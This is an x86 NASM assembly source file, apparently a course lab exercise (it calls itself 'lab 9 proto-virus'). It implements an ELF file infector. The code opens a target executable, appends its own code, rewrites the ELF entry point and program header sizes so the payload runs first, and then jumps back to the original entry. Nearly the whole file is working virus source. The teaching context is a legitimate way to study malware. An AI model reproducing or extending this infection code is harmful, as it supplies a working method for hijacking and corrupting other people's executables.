%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro
%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro
%macro  exit 1
	syscall1 1, %1
%endmacro
%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro
%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro
%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro
%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro
%macro  close 1
	syscall1 6, %1
%endmacro
%define	STK_RES	200
%define	RDWR	2
%define	STDOUT	1
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%macro load_ELF 0
	mov eax,dword[ebp-4]		;so eax is file dis
	lseek eax,24,SEEK_SET 		;buffer on ENTRY file
	mov eax,dword[ebp-4]		;so eax is file dis
	read eax,esp,4				;ebx is the ENTRY addres
	
%endmacro

%macro change_Entry 0
	mov eax,dword[ebp-4]		;so eax is file dis
	lseek eax,24,SEEK_SET 		;buffer on ENTRY file
	mov eax,dword[ebp-4]		;so eax is file dis
	mov ecx,dword[ebp-8]			;size of sec text
	mov ebx,0x08048000			;virsddres of start
	add ebx,ecx					;=end of file
	mov dword[ebp-12],ebx
	mov esp,ebp
	sub esp,12
	write eax,esp,4
%endmacro
	
	global _start
	section .text
_start:
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

; You code for this lab goes here

;print "This is a virus"
	call get_my_loc				;get my loc
	mov edx,next_i
	sub edx,justPrint
	sub ecx,edx
	write STDOUT,ecx,16

;open:
	call get_my_loc				;get my loc
	mov edx,next_i
	sub edx,FileName
	mov ebx,ecx
	sub ebx,edx
	mov dword[ebp-20],ebx		;to check
	mov ebx,dword[ebp-20]
	open ebx,RDWR,0777
cmp eax,0
jg notRunTime			;case we in runtime

	;write the virus
		;mov dword[ebp-4],eax			;file dis dword[ebp-4]
		;lseek eax,SEEK_SET,SEEK_END	;get to the end code
		;mov dword[ebp-8],eax			;file size dword[ebp-8]
		;mov eax,dword[ebp-4]			;so eax is file dis
		;mov ebx,_start
		;mov ecx,virus_end-_start
		;write eax,ebx,ecx 

	;call get_my_loc				;get my loc
	;mov edx,next_i
	;sub edx,justPrint
	;sub ecx,edx
	;write STDOUT,ecx,16


	;make it return
		call get_my_loc				;get my loc
		mov edx,next_i
		sub edx,PreviousEntryPoint
		sub ecx,edx
		jmp [ecx]

notRunTime:
	mov dword[ebp-4],eax	;file dis dword[ebp-4]
	;get to the end code
	lseek eax,SEEK_SET,SEEK_END
	mov dword[ebp-8],eax	;file size dword[ebp-8]
	;load_ELF

;write the virus
	mov eax,dword[ebp-4]		;so eax is file dis
	mov ebx,_start
	mov ecx,virus_end-_start
	write eax,ebx,ecx 


;get the old entry and make the virus point to the old start

	mov eax,dword[ebp-4]		;so eax is file dis
	lseek eax,24,SEEK_SET 		;buffer on ENTRY file
	mov eax,dword[ebp-4]		;so eax is file dis
	read eax,esp,4				;ebx is the ENTRY addres
	mov ebx,dword[esp]
	mov dword[ebp-12],ebx		;old ENTRY dword[ebp-12] with offset

	mov eax,dword[ebp-4]		;so eax is file dis
	lseek eax,SEEK_SET,SEEK_END
	mov ebx,0
	add ebx,eax
	sub ebx,4
	mov eax,dword[ebp-4]		;so eax is file dis
	lseek eax,ebx,SEEK_SET
	mov eax,dword[ebp-4]		;so eax is file dis
	mov esp,ebp
	sub esp,12
	write eax,esp,4

;get the offset of 2nd prog
	mov eax,dword[ebp-4]		;so eax is file dis
	lseek eax,88,SEEK_SET		;84 is constant for 2nd pr.hd
	 							;+4 ofset-field
	mov eax,dword[ebp-4]		;so eax is file dis
	read eax,esp,4				;ebx is the VirtAddr
	mov ebx,dword[esp]
	mov dword[ebp-28],ebx		;offset in- dword[ebp-28]

;make ENTRY to the virus
	mov eax,dword[ebp-4]		;so eax is file dis
	lseek eax,92,SEEK_SET 		;buffer on ENTRY file
	mov eax,dword[ebp-4]		;so eax is file dis
	read eax,esp,4				;ebx is the ENTRY addres
	mov ebx,dword[esp]
	mov eax,dword[ebp-4]			;so eax is file dis
	;mov ebx,dword[ebp-12]			;virsddres of start
	;mov ebx,0x08048000				;virsddres of start

	;dor add
	mov ecx,dword[ebp-28]
	sub ebx,ecx
	;dor add end

	mov ecx,dword[ebp-8]			;size of sec text
	add ebx,ecx						;=end of file

	mov dword[ebp-16],ebx		;NEW ENTRY dword[ebp-16]
	mov esp,ebp
	sub esp,16
	mov eax,dword[ebp-4]		;so eax is file dis
	lseek eax,24,SEEK_SET 		;buffer on ENTRY file
	mov eax,dword[ebp-4]		;so eax is file dis
	write eax,esp,4



;load the second in pr-header

;get the size field...
	mov eax,dword[ebp-4]		;so eax is file dis
	lseek eax,100,SEEK_SET		;84 is constant for 2nd pr.hd
	 							;+16 ofset of the SIZE field
	mov eax,dword[ebp-4]		;so eax is file dis
	read eax,esp,4				;ebx is the VirtAddr
	mov ebx,dword[esp]			;ebx=filesize
	mov dword[ebp-24],ebx		;2nd prhd.size in- dword[ebp-24]

;or the shimony fix...

	;mov eax,dword[ebp-4]		;so eax is file dis
	;lseek eax,0,SEEK_END		
	;mov dword[ebp-24],eax		;size of all the file- dword[ebp-24]

	mov ecx,virus_end
	sub ecx,_start				;ecx=size of virus
	add ebx,ecx	
	mov ecx,dword[ebp-28]		;ecx=offset field
	sub ebx,ecx				
	mov dword[ebp-32],ebx		;NEW SIZE dword[ebp-32]

;to change the size
	mov eax,dword[ebp-4]		;so eax is file dis
	lseek eax,100,SEEK_SET		;84 is constant for 2nd pr.hd
	 							;+16 ofset of the field	mov eax,dword[ebp-4]		;so eax is file dis
	mov esp,ebp
	sub esp,32
	mov eax,dword[ebp-4]		;so eax is file dis
	write eax,esp,4
;to change the mem
	mov eax,dword[ebp-4]		;so eax is file dis
	lseek eax,104,SEEK_SET		;84 is constant for 2nd pr.hd
	 							;+20 ofset of the field	mov eax,dword[ebp-4]		;so eax is file dis
	mov esp,ebp
	sub esp,32
	mov eax,dword[ebp-4]		;so eax is file dis
	write eax,esp,4

;closing the file
mov eax,dword[ebp-4]		;so eax is file dis
close eax	

;exiting
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

get_my_loc:
	call next_i
next_i:
    pop ecx
    ret	

FileName:	db "abc", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
justPrint:	db "This is a virus",10, 0
PreviousEntryPoint: dd VirusExit
virus_end:


